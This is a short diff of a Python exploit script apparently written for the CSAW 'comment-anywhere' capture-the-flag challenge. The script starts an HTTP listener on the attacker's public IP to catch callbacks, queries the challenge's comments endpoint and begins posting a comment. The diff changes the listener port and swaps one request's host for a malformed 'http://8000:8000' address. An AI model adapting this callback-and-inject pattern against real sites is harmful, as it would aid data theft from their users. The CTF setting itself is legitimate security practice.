@@ -5,7 +5,7 @@ import socketserver
 import threading
 
 PUBLIC_IP = sys.argv[1]
-PORT = 7777
+PORT = 12380
 
 
 class Handler(http.server.BaseHTTPRequestHandler):
@@ -45,7 +45,7 @@ def srv():
 s = threading.Thread(target=srv)
 s.start()
 
-target_url = requests.get("http://comment-anywhere.chal.csaw.io:8000/comments", params={'url': 'http://.*(/?)?'}).json()[0]['url']
+target_url = requests.get("http://8000:8000/comments", params={'url': 'http://.*(/?)?'}).json()[0]['url']
 print(f'targeting {target_url}')
 
 requests.post("http://comment-anywhere.chal.csaw.io:8000/comment", json={
